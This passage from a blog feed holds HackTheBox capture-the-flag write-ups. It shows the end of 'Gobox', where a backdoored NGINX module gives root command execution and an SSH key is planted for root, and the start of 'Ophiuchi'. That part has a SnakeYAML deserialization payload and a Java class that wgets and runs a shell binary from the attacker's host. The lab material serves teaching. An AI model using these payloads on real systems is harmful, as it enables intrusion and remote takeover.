<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ nmap -sV -sC -p4566 10.10.11.113
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-09-08 06:51 EDT
Nmap scan report <span class="k">for</span> gobox.htb <span class="o">(</span>10.10.11.113<span class="o">)</span>
Host is up <span class="o">(</span>0.047s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
4566/tcp open  http    nginx
<span class="p">|</span>_http-title: <span class="m">403</span> Forbidden

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 13.35 seconds
</code></pre></div><p>But if I add the authorization header, I get the following results:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ curl -sv http://10.10.11.113:4566/ -H <span class="s1">&#39;Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbm
</span><span class="s1">dFc3BvcnRz&#39;</span>
*   Trying 10.10.11.113:4566...
* Connected to 10.10.11.113 <span class="o">(</span>10.10.11.113<span class="o">)</span> port <span class="m">4566</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET / HTTP/1.1
&gt; Host: 10.10.11.113:4566
&gt; User-Agent: curl/7.74.0
&gt; Accept: */*
&gt; Authorization: Basic SXBwc2VjIFdhcyBIZXJlIC0tIFVsdGltYXRlIEhhY2tpbmcgQ2hhbXBpb25zaGlwIC0gSGFja1RoZUJveCAtIEhhY2tpbmdFc3BvcnRz
&gt;
* Mark bundle as not supporting multiuse
&lt; HTTP/1.1 <span class="m">404</span>
&lt; Server: nginx
&lt; Date: Thu, <span class="m">09</span> Sep <span class="m">2021</span> 07:33:54 GMT
&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8
&lt; Content-Length: <span class="m">21</span>
&lt; Connection: keep-alive
&lt; access-control-allow-origin: *
&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
&lt; access-control-allow-headers: authorization,content-type,content-length,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging,amz-sdk-invocation-id,amz-sdk-request
&lt; access-control-expose-headers: x-amz-version-id
&lt;
* Connection <span class="c1">#0 to host 10.10.11.113 left intact</span>
<span class="o">{</span><span class="s2">&#34;status&#34;</span>: <span class="s2">&#34;running&#34;</span><span class="o">}</span>
</code></pre></div><p>As for port 80 and 8080, it&rsquo;s clear that they are the homepage and the login page site.</p>
<p>The next one is request routing for port 8000, this is my first time to see &ldquo;command on&rdquo; written on NGINX&rsquo;s config file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nginx" data-lang="nginx"><span class="k">server</span> <span class="p">{</span>
        <span class="kn">listen</span> <span class="n">127.0.0.1</span><span class="p">:</span><span class="mi">8000</span><span class="p">;</span>
        <span class="kn">location</span> <span class="s">/</span> <span class="p">{</span>
                <span class="kn">command</span> <span class="no">on</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
</code></pre></div><p>When I try to interact with it, it returns nothing.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ curl -s http://127.0.0.1:8000
www-data@gobox:/opt$ curl -I http://127.0.0.1:8000
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>With <code>nc</code>, it returns a &ldquo;Bad Request&rdquo;.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/$ nc -vn 127.0.0.1 <span class="m">8000</span>
Connection to 127.0.0.1 <span class="m">8000</span> port <span class="o">[</span>tcp/*<span class="o">]</span> succeeded!
/
HTTP/1.1 <span class="m">400</span> Bad Request
Server: nginx
Date: Wed, <span class="m">08</span> Sep <span class="m">2021</span> 11:13:48 GMT
Content-Type: text/html
Content-Length: <span class="m">150</span>
Connection: close

&lt;html&gt;
&lt;head&gt;&lt;title&gt;400 Bad Request&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;center&gt;&lt;h1&gt;400 Bad Request&lt;/h1&gt;&lt;/center&gt;
&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;
&lt;/body&gt;
&lt;/html&gt;

</code></pre></div><p>If I look at the date modified of the NGINX folder, there are 6 folders that were modified on Aug. 26 at the same time.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -lt
total <span class="m">64</span>
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snippets
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-available
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 sites-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-enabled
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 conf.d
drwxr-xr-x <span class="m">2</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 modules-available
-rw-r--r-- <span class="m">1</span> root root <span class="m">1484</span> Aug <span class="m">24</span> 20:30 nginx.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">3071</span> Feb  <span class="m">4</span>  <span class="m">2019</span> win-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1077</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi.conf
-rw-r--r-- <span class="m">1</span> root root <span class="m">1007</span> Feb  <span class="m">4</span>  <span class="m">2019</span> fastcgi_params
-rw-r--r-- <span class="m">1</span> root root <span class="m">2837</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-utf
-rw-r--r-- <span class="m">1</span> root root <span class="m">2223</span> Feb  <span class="m">4</span>  <span class="m">2019</span> koi-win
-rw-r--r-- <span class="m">1</span> root root <span class="m">3957</span> Feb  <span class="m">4</span>  <span class="m">2019</span> mime.types
-rw-r--r-- <span class="m">1</span> root root  <span class="m">180</span> Feb  <span class="m">4</span>  <span class="m">2019</span> proxy_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">636</span> Feb  <span class="m">4</span>  <span class="m">2019</span> scgi_params
-rw-r--r-- <span class="m">1</span> root root  <span class="m">664</span> Feb  <span class="m">4</span>  <span class="m">2019</span> uwsgi_params
</code></pre></div><p>When I visit the <code>modules-enabled</code> folder, I find a module with a suspicious name, &ldquo;backdoor&rdquo; !</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ ls -l modules-enabled
total <span class="m">12</span>
-rw-r--r-- <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 20:50 50-backdoor.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">61</span> Aug <span class="m">23</span> 14:43 50-mod-http-image-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-image-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">60</span> Aug <span class="m">23</span> 14:43 50-mod-http-xslt-filter.conf -&gt; /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">48</span> Aug <span class="m">23</span> 14:43 50-mod-mail.conf -&gt; /usr/share/nginx/modules-available/mod-mail.conf
lrwxrwxrwx <span class="m">1</span> root root <span class="m">50</span> Aug <span class="m">23</span> 14:43 50-mod-stream.conf -&gt; /usr/share/nginx/modules-available/mod-stream.conf
</code></pre></div><p>The module load a <code>.so</code> file called <code>ngx_http_execute_module.so</code>. I find that file under <code>/usr/lib/nginx/modules/</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ cat modules-enabled/50-backdoor.conf
load_module modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx$ find / -type f -name <span class="s2">&#34;ngx_http_execute_module.so&#34;</span> 2&gt;/dev/null
/usr/lib/nginx/modules/ngx_http_execute_module.so
www-data@gobox:/etc/nginx$ file /usr/lib/nginx/modules/ngx_http_execute_module.so
/usr/lib/nginx/modules/ngx_http_execute_module.so: ELF 64-bit LSB shared object, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4279ae42bf642b21378aa43c06b52f4d0b89f2ad, with debug_info, not stripped
</code></pre></div><p>I try to find the origin of this module by grabbing some readable code using  <code>strings</code>. It turns out the backdoor is taken from this Github repository: <a href="https://github.com/limithit/NginxExecute">NginxExecute</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;.c$&#39;</span>
ngx_pcalloc
__ctype_b_loc
realloc
malloc
ngxexecute_strncpy_alloc
ngxexecute_strcpy_alloc
~iHc
/home/ubuntu/NginxExecute//ngx_result.c
7src
!w<span class="s2">&#34;c
</span><span class="s2">I%&amp;c
</span><span class="s2">I=&amp;c
</span><span class="s2">?src
</span><span class="s2">3src
</span><span class="s2">3src
</span><span class="s2">ngx_http_execute_module.c
</span><span class="s2">ngx_process.c
</span><span class="s2">ngx_result.c
</span><span class="s2">ngx_http_execute_module_modules.c
</span><span class="s2">ngx_pcalloc
</span><span class="s2">pcre32_malloc
</span><span class="s2">timespec
</span><span class="s2">pcre_malloc
</span><span class="s2">nalloc
</span><span class="s2">start_msec
</span><span class="s2">pcre16_malloc
</span><span class="s2">async
</span><span class="s2">pcre32_stack_malloc
</span><span class="s2">tv_nsec
</span><span class="s2">ngx_argc
</span><span class="s2">pcre16_stack_malloc
</span><span class="s2">valid_msec
</span><span class="s2">/home/ubuntu/NginxExecute//ngx_http_execute_module.c
</span><span class="s2">valid_sec
</span><span class="s2">pcre_stack_malloc
</span><span class="s2">tv_sec
</span><span class="s2">ngx_current_msec
</span><span class="s2">proc
</span><span class="s2">start_sec
</span><span class="s2">error_sec
</span><span class="s2">updating_sec
</span><span class="s2">__ctype_b_loc
</span><span class="s2">/home/ubuntu/NginxExecute//ngx_process.c
</span><span class="s2">__src
</span><span class="s2">ngxexecute_strncpy_alloc
</span><span class="s2">ngxexecute_strcpy_alloc
</span><span class="s2">realloc
</span><span class="s2">/home/ubuntu/NginxExecute//ngx_result.c
</span><span class="s2">objs/ngx_http_execute_module_modules.c
</span><span class="s2">crtstuff.c
</span><span class="s2">ngx_http_execute_module.c
</span><span class="s2">ngx_process.c
</span><span class="s2">ngx_result.c
</span><span class="s2">ngx_http_execute_module_modules.c
</span><span class="s2">ngxexecute_strncpy_alloc
</span><span class="s2">ngxexecute_strcpy_alloc
</span><span class="s2">ngx_pcalloc
</span><span class="s2">.plt.sec
</span><span class="s2">.dynamic
</span><span class="s2">.debug_loc
</span></code></pre></div><h4 id="nginx-backdoor">NGINX Backdoor</h4>
<p>According to the README file from the repository, I just need to send a HTTP request with <code>?system.run[command]</code>, but it doesn&rsquo;t work here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -v <span class="s2">&#34;http://127.0.0.1:8000/?system.run[whoami]&#34;</span>
*   Trying 127.0.0.1:8000...
* TCP_NODELAY <span class="nb">set</span>
* Connected to 127.0.0.1 <span class="o">(</span>127.0.0.1<span class="o">)</span> port <span class="m">8000</span> <span class="o">(</span><span class="c1">#0)</span>
&gt; GET /?system.run<span class="o">[</span>ifconfig<span class="o">]</span> HTTP/1.1
&gt; Host: 127.0.0.1:8000
&gt; User-Agent: curl/7.68.0
&gt; Accept: */*
&gt;
* Empty reply from server
* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
</code></pre></div><p>Running another <code>strings</code> command against the backdoor reveals it uses <code>ippsec.run</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «loot» «10.10.14.97»
$ strings ngx_http_execute_module.so <span class="p">|</span> grep <span class="s1">&#39;run&#39;</span>
ippsec.run
</code></pre></div><p>Now if I send <code>?ippsec.run[whoami]</code>, it returns:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[whoami]&#34;</span>
root
</code></pre></div><p>Using the previous reverse shell script on <code>/tmp/</code>, I could get an interactive shell access as root, but then the shell gets exited by itself.</p>
<p><div class="img-container"><img src="../../../../../ctf/htb/machines/active-boxes/gobox/imgs/image-20210908184311943.png" alt="image-20210908184311943"  /></div>
</p>
<p>So instead, I inject my SSH public key.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/etc/nginx$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H&#39;</span> &gt; /tmp/iamf
www-data@gobox:/etc/nginx$ curl -g <span class="s2">&#34;http://127.0.0.1:8000/?ippsec.run[cat /tmp/iamf | tee /root/.ssh/authorized_keys]&#34;</span>
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINEBYhHk8/REIEriu8mkvQf4nihDP/deVl1j3Do/9R1H
</code></pre></div><p>Now I can SSH login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «gobox» «10.10.14.97»
$ ssh root@10.10.11.113
Welcome to Ubuntu 20.04.3 LTS <span class="o">(</span>GNU/Linux 5.4.0-81-generic x86_64<span class="o">)</span>

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed <span class="m">08</span> Sep <span class="m">2021</span> 11:52:18 AM UTC

  System load:                      0.0
  Usage of /:                       37.1% of 9.72GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        <span class="m">244</span>
  Users logged in:                  <span class="m">0</span>
  IPv4 address <span class="k">for</span> br-bb21b8b9b286: 172.28.0.1
  IPv4 address <span class="k">for</span> docker0:         172.17.0.1
  IPv4 address <span class="k">for</span> ens160:          10.10.11.113


<span class="m">0</span> updates can be applied immediately.


The list of available updates is more than a week old.
To check <span class="k">for</span> new updates run: sudo apt update

Last login: Thu Aug <span class="m">26</span> 23:56:12 <span class="m">2021</span>
root@gobox:~#
</code></pre></div><p>And I can grab the root flag.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# ls -l
total <span class="m">12</span>
-rwxr-xr-x <span class="m">1</span> root root  <span class="m">536</span> Aug <span class="m">24</span> 20:33 iptables.sh
-rw------- <span class="m">1</span> root root   <span class="m">33</span> Aug <span class="m">26</span> 21:10 root.txt
drwxr-xr-x <span class="m">3</span> root root <span class="m">4096</span> Aug <span class="m">26</span> 21:26 snap
root@gobox:~# cat root.txt
81d35...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="explore">Explore</h2>
<h3 id="undetected-ports">Undetected ports</h3>
<p>During enumeration, when I printed the networking status, I noticed that ports 9000, 9001, and 4566 should be accessible from external, with the exception that port 4566 needs an authentication header set first to be accessible.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@gobox:/opt$ netstat -tlpn
<span class="o">(</span>Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.<span class="o">)</span>
Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9000            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:9001            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:8080            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:4566            0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        <span class="m">0</span>      <span class="m">0</span> 127.0.0.1:8000          0.0.0.0:*               LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9000                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::9001                 :::*                    LISTEN      -
tcp6       <span class="m">0</span>      <span class="m">0</span> :::22                   :::*                    LISTEN
</code></pre></div><p>It turns out there is a set of <code>iptables</code> rules that drop any connection coming to these ports.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# iptables -L
Chain INPUT <span class="o">(</span>policy ACCEPT<span class="o">)</span>
target     prot opt <span class="nb">source</span>               destination         
ACCEPT     all  --  localhost/8          anywhere            
ACCEPT     all  --  172.16.0.0/12        anywhere            
DROP       tcp  --  anywhere             anywhere             tcp dpt:9002
DROP       tcp  --  anywhere             anywhere             tcp dpt:9001
DROP       tcp  --  anywhere             anywhere             tcp dpt:9000
...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><p>Shouldn&rsquo;t it then return with <code>filtered</code> status?</p>
<p>Well it was purely my mistake, I used <code>--min-rate=10000</code>. This could be the reason <code>nmap</code> misidentified the filtered port as closed.</p>
<h3 id="gobox-request-routing">Gobox Request Routing</h3>
<p>The first time I looked into the NGINX configuration file, it didn&rsquo;t make sense to me why my web shell is on the host OS? In fact, I uploaded my web shell to an S3 bucket, which is also a container.</p>
<p>Now with root access obtained, I could understand what was happening. It was synchronization!</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">root@gobox:~# cat /var/spool/incron/root 
/opt/deploy/.localstack/data/recorded_api_calls.json    IN_MODIFY       /usr/bin/aws --endpoint-url http://127.0.0.1:9000 s3 sync s3://website /opt/website
/home/ubuntu/user.txt   IN_MODIFY       cp /home/ubuntu/user.txt /var/www/
</code></pre></div><p>So if I upload something into the bucket, the host will have it as well.</p>
<p>I also looked at how the web routing is done in this box and eventually visualize it as shown below:</p>
<p><div class="img-container"><img src="imgs/image-20210912193743912.png" alt="image-20210912193743912"  /></div>
</p>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://www.onsecurity.io/blog/go-ssti-method-research/">https://www.onsecurity.io/blog/go-ssti-method-research/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Ophiuchi</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</link>
      <pubDate>Fri, 06 Aug 2021 17:52:28 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-ophiuchi/</guid>
      <description>Deserialization attack on YAML and reversing web assembly</description>
      <content:encoded><![CDATA[<p>Ophiuchi starts off by enumerating a Java web application that offers a service for parsing YAML. The parser is vulnerable to a deserialization attack. Exploiting the vulnerability results in an interactive shell access to the system. Internal enumeration of the system finds a set of user credentials. This user is allowed to run a specific Go program which loads a web assembly file and executes a script file if a certain condition is met. The program loads these files without their absolute path. As a result, the files could be replaced with malicious ones to gain root access.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>YAML deserialization attack</li>
<li>Web Assembly (WASM)</li>
<li>Code Analysis (Go &amp; WASM)</li>
<li>Sudo exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li>Java Compiler</li>
<li><a href="https://github.com/artsploit/yaml-payload">Yaml-payload</a></li>
<li><a href="https://github.com/WebAssembly/wabt">Wabt</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full TCP scan using <code>nmap</code> discovers 2 open ports: SSH on port 22 and an Apache Tomcat servlet on port 8080.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «ophiuchi» «10.10.14.53» 
$ nmap -p- --reason -oA nmap/10-tcp-allport-ophiuchi 10.10.10.227                                           
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:09 EDT
Nmap scan report <span class="k">for</span> 10.10.10.227
Host is up, received echo-reply ttl <span class="m">63</span> <span class="o">(</span>0.056s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> closed ports
Reason: <span class="m">65533</span> resets
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl <span class="m">63</span>
8080/tcp open  http-proxy syn-ack ttl <span class="m">63</span>

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 77.26 seconds

→ root@kali «ophiuchi» «10.10.14.53» 
$ nmap -p22,8080 -sC -sV -oA nmap/10-tcp-allport-scripts-ophiuchi 10.10.10.227
Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-17 10:21 EDT
Nmap scan report <span class="k">for</span> 10.10.10.227
Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
8080/tcp open  http    Apache Tomcat 9.0.38
<span class="p">|</span>_http-title: Parse YAML
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 9.35 seconds
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-8080---website">TCP 8080 - Website</h3>
<p>On port 8080, the machine hosts a site that serves a YAML parser service.</p>
<p><div class="img-container"><img src="imgs/image-20210617212718924.png" alt="image-20210617212718924"  /></div>
</p>
<p>When I submit a sample YAML payload, it returns the following message.</p>
<p><div class="img-container"><img src="imgs/image-20210729200644337.png" alt="image-20210729200644337"  /></div>
</p>
<p>But, if I send an invalid payload, for example:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">test: test
  test: test
</code></pre></div><p>I get the following results:</p>
<p><div class="img-container"><img src="imgs/image-20210729200616087.png" alt="image-20210729200616087"  /></div>
</p>
<p>From the error above, I noticed the <code>org.yaml.snake.yaml.load</code> package is being used. This package is typically used for <a href="https://www.baeldung.com/java-snake-yaml#basic-usage">YAML deserialization</a>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-tomcat">Shell as tomcat</h3>
<h4 id="snakeyaml-insecure-deserialization---poc">SnakeYAML Insecure Deserialization - PoC</h4>
<p>Although the web app said the parser feature is temporarily on hold, I&rsquo;m sure that each payload I submit is being processed on the backend.</p>
<p>Searching on Google about the Snake YAML deserialization attack, I came across <a href="https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html">this post</a>. This is exactly what I need. I took the payload from that post and modified the URL to point to my HTB IP. I will setup a netcat listener and submit the payload to the parser.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-yaml" data-lang="yaml"><span class="cp">!!javax.script.ScriptEngineManager</span><span class="w"> </span><span class="p">[</span><span class="w">
</span><span class="w">  </span><span class="cp">!!java.net.URLClassLoader</span><span class="w"> </span><span class="p">[[</span><span class="w">
</span><span class="w">    </span><span class="cp">!!java.net.URL</span><span class="w"> </span><span class="p">[</span><span class="s2">&#34;http://10.10.14.23/iamf&#34;</span><span class="p">]</span><span class="w">
</span><span class="w">  </span><span class="p">]]</span><span class="w">
</span><span class="w"></span><span class="p">]</span><span class="w">
</span></code></pre></div><p>On my listener, I get the following request.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «ophiuchi» «10.10.14.23» 
$ nc -nvlp <span class="m">80</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">80</span> ...
connect to <span class="o">[</span>10.10.14.23<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.227<span class="o">]</span> <span class="m">53002</span>
GET /iamf HTTP/1.1
User-Agent: Java/11.0.8
Host: 10.10.14.23
Accept: text/html, image/gif, image/jpeg, *<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2, */*<span class="p">;</span> <span class="nv">q</span><span class="o">=</span>.2
Connection: keep-alive
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210729202237145.png" alt="image-20210729202237145"  /></div>
</p>
<p>That means the parser is vulnerable to insecure deserialization attack!</p>
<h4 id="snakeyaml-insecure-deserialization---weaponize">SnakeYAML Insecure Deserialization - Weaponize</h4>
<p>The researcher on the previous post uses a <code>.jar</code> payload from <a href="https://github.com/artsploit/yaml-payload">this Github repo</a> to get a code execution. I will clone that repo to my machine.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.23» 
$ git clone https://github.com/artsploit/yaml-payload.git <span class="o">&amp;&amp;</span> <span class="nb">cd</span> yaml-payload
Cloning into <span class="s1">&#39;yaml-payload&#39;</span>...
remote: Enumerating objects: 10, <span class="k">done</span>.
remote: Total <span class="m">10</span> <span class="o">(</span>delta 0<span class="o">)</span>, reused <span class="m">0</span> <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused <span class="m">10</span>
Receiving objects: 100% <span class="o">(</span>10/10<span class="o">)</span>, <span class="k">done</span>.
</code></pre></div><p>From that repo, I will modify the codes of <code>AwesomeScriptEngineFactory.java</code> file to make it executes a sequence OS commands that will grab my malicious binary and execute it afterwards.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kn">package</span> <span class="nn">artsploit</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">javax.script.ScriptEngine</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">javax.script.ScriptEngineFactory</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.List</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AwesomeScriptEngineFactory</span> <span class="kd">implements</span> <span class="n">ScriptEngineFactory</span> <span class="o">{</span>

    <span class="kd">public</span> <span class="nf">AwesomeScriptEngineFactory</span><span class="o">()</span> <span class="o">{</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;wget http://10.10.14.23/iamf-shell -O /tmp/iamf-shell;&#34;</span><span class="o">);</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;chmod +x /tmp/iamf-shell&#34;</span><span class="o">);</span>
            <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="s">&#34;/tmp/iamf-shell&#34;</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
    <span class="o">}</span>
    
<span class="o">...[</span><span class="n">SNIP</span><span class="o">]...</span>
<span class="o">}</span>

</code></pre></div><p>Next, I will compile the code and pack the whole <code>src/</code> folder into a java archive (jar) file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «yaml-payload» «10.10.14.23» git:<span class="o">(</span>master<span class="o">)</span> ✗ 
$  javac src/artsploit/AwesomeScriptEngineFactory.java <span class="o">&amp;&amp;</span> jar -cvf yaml-payload.jar -C src/ .
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class="o">=</span>on -Dswing.aatext<span class="o">=</span><span class="nb">true</span>
adding: META-INF/ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: META-INF/MANIFEST.MF <span class="o">(</span><span class="nv">in</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>56<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
adding: ./ <span class="o">(</span><span class="nv">in</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span><span class="nv">out</span><span class="o">=</span>0<span class="o">)</span> <span class="o">(</span>stored 0%<span class="o">)</span>
